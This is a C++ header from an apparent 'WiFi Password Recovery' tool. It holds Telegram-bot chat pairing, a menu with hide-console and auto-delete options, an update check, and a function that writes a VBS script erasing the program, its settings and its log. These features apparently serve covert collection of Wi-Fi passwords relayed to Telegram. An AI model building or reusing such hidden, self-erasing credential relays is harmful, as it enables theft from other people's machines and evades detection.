#pragma once

// File per le funzioni

void PrintTitle(string Version, short Returns = 0)
{
	TextColor tc;
	tc.SetColor(tc.Lime);

	cout << "  __        ___ _____ _   ____                                     _   ____                                    " << endl;
	cout << "  \\ \\      / (_)  ___(_) |  _ \\ __ _ ___ _____      _____  _ __ __| | |  _ \\ ___  ___ _____   _____ _ __ _   _ " << endl;
	cout << "   \\ \\ /\\ / /| | |_  | | | |_) / _` / __/ __\\ \\ /\\ / / _ \\| '__/ _` | | |_) / _ \\/ __/ _ \\ \\ / / _ \\ '__| | | |" << endl;
	cout << "    \\ V  V / | |  _| | | |  __/ (_| \\__ \\__ \\\\ V  V / (_) | | | (_| | |  _ <  __/ (_| (_) \\ V /  __/ |  | |_| |" << endl;
	cout << "     \\_/\\_/  |_|_|   |_| |_|   \\__,_|___/___/ \\_/\\_/ \\___/|_|  \\__,_| |_| \\_\\___|\\___\\___/ \\_/ \\___|_|   \\__, |" << endl;
	cout << "| By Criper98                                                                                            |___/ " << endl;
	cout << "| Versione [" << Version << "]" << endl;
	tc.SetColor(tc.Default);
	for (int i = 0; i < Returns; i++)
		cout << endl;
	return;
}

string GetChatID(TelegramBot& tb, Log& lg) // Funzione per ottenere l'ID della chat al quale il bot Telegram dovrà mandare i messaggi
{
	LastMsg lm; // Struttura definita in EssCurl per salvare i dati dell'ultimo messaggio ricevuto dal bot
	SendMsg sm;
	SystemUtils su;
	CLInterface cli;
	TextColor tc;
	int Number = su.GetRandomNumber(999999); // Genero un numero randomico tra 0 e 999998

	cout << "Codice: ["; tc.SetColor(tc.Lime); cout << Number; tc.SetColor(tc.Default); cout << "]" << endl;
	cout << "Attendo ricezione codice";
	cli.DotsBar();

	while (true) // Loop per controllare a intervalli di 1s i nuovi messaggi ricevuti sul bot
	{
		if (tb.GetLastMessage(lm) == 0) // Se ricevo un messaggio:
		{
			if (lm.Text == to_string(Number)) // Se il messaggio ricevuto corrisponde al numero generato:
			{
				cli.StopBar(100);

				cout << "\nChat associata all'utente [";
				tc.SetColor(tc.Green);
				cout << lm.Username;
				tc.SetColor(tc.Default);
				cout << "]" << endl;

				sm.ChatID = lm.ChatID;
				sm.Text = "Chat associata!";

				tb.SendMessage(sm);
				Sleep(2000);
				return lm.ChatID;
			}
			else
				lg.WriteLog("Codice errato, codice corretto [" + to_string(Number) + "] codice ricevuto [" + lm.Text + "].");
		}

		Sleep(1000);
	}

	return "-1"; // Non succede, ma se succede...
}

bool VerificaChatID(SettingsFile& sf, Log& lg)
{
	if (sf.GetSetting("Chat_ID") == "-1")
	{
		lg.WriteLog("[Errore]: Associazione ChatID fallita.");
		cout << "Qualcosa e' andato storto durante l'associazione." << endl;
		system("pause");
		return false;
	}

	return true;
}

VectSettings GetSettings(SettingsFile& sf, Log& lg)
{
	VectSettings Settings(4);

	Settings[0].Name = "Salva";
	Settings[0].Escape = true;

	Settings[1].Name = "Nascondi Console";
	Settings[1].CheckValue = "true";
	Settings[1].Value = sf.GetSetting("HideConsole");

	Settings[2].Name = "Controlla Update";
	Settings[2].CheckValue = "true";
	Settings[2].Value = sf.GetSetting("CheckUpdate");

	Settings[3].Name = "Auto Eliminazione";
	Settings[3].CheckValue = "true";
	Settings[3].Value = sf.GetSetting("AutoDelete");

	lg.WriteLog("Settaggi ottenuti.");

	return Settings;
}

bool EseguiInterfaccia(SettingsFile& sf, string Versione, TelegramBot& tb, Log& lg)
{
	lg.WriteLog("Inizializzazione CLI.");

	CLInterface cli;
	TextColor tc;
	VectString MainMenu;
	VectSettings Settings;

	// Inizializzo i vari menu per la CLI
	MainMenu.push_back("Esci");
	MainMenu.push_back("Cambia ChatID Associato");
	MainMenu.push_back("Impostazioni");
	MainMenu.push_back("Recupera Password");

	while (true)
	{
		system("cls");
		PrintTitle(Versione, 1);
		cli.SubTitle("Menu Principale", 75, tc.Green);

		switch (cli.MenuSingleSelQuadre(MainMenu))
		{
			case 0:
				lg.WriteLog("Uscita.");
				return false;
				break;

			case 1:
				lg.WriteLog("Associazione ChatID.");

				system("cls");
				PrintTitle(Versione, 1);
				cli.SubTitle("Associazione Chat Telegram", 75, tc.Green);

				cout << "Per associare la chat Telegram scrivere al bot @WiFiPRbot il seguente codice." << endl;
				sf.SetSetting("Chat_ID", GetChatID(tb, lg));
				if (!VerificaChatID(sf, lg))
					return false;
				sf.SetSetting("SetChatID", "false");

				lg.WriteLog("ChatID associato.");
				break;

			case 2:
				lg.WriteLog("Impostazioni.");

				for (bool i = true; i;)
				{
					system("cls");
					PrintTitle(Versione, 1);
					cli.SubTitle("Impostazioni", 75, tc.Green);

					Settings = GetSettings(sf, lg);

					switch (cli.MenuSettings(Settings))
					{
						case 0:
							i = false;
							break;

						case 1:
							if (Settings[1].Value == "true")
								sf.SetSetting("HideConsole", "false");
							else
								sf.SetSetting("HideConsole", "true");
							break;

						case 2:
							if (Settings[2].Value == "true")
								sf.SetSetting("CheckUpdate", "false");
							else
								sf.SetSetting("CheckUpdate", "true");
							break;

						case 3:
							if (Settings[3].Value == "true")
								sf.SetSetting("AutoDelete", "false");
							else
								sf.SetSetting("AutoDelete", "true");
							break;
					}
				}
				break;

			case 3:
				lg.WriteLog("Recupera Password.");
				return true;
				break;
		}
	}

	return false;
}

void CheckUpdate(string Versione, Log& lg) // Funzione per controllare la presenza di Update
{
	GitHub gh; // Classe di EssCurl per l'uso semplificato delle API di GitHub
	EasyMSGB msgb;
	SystemUtils su;

	lg.WriteLog("Verifica Update.");
	string LastRelease = gh.GetRepoTag("criper98", "wifi-password-recovery", "UserAuth"); // Ottengo il TAG più recente

	if (LastRelease != Versione) // Se le versioni non coincidono:
	{
		lg.WriteLog("Update trovato, versione locale [" + Versione + "], versione attuale [" + LastRelease + "]");
		if (msgb.YesNo("La versione di \"WiFi Password Recovery\" che stai usando non e' aggiornata.\nScaricare la versione piu' recente?", msgb.Info, "Update!"))
			su.OpenURL("https://github.com/Criper98/WiFi-Password-Recovery/releases/latest");
	}
}

void AutoDelete()
{
	DirUtils du;
	SystemUtils su;

	du.ChangeCurrDir(du.GetFilePath());

	du.WriteFile("AutoDelete.vbs", "WScript.Sleep 5000\ndim filesys\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullFilePath() +"\"\nfilesys.DeleteFile \"" + du.GetFilePath() + "settings.ini\"\nfilesys.DeleteFile \"" + du.GetFilePath() + "AutoDelete.vbs\"\nfilesys.DeleteFile \"" + du.GetFilePath() + "WPR.log\"\n");

	su.NoOutputCMD("start \"\" \"" + du.GetFilePath() + "AutoDelete.vbs\"");
}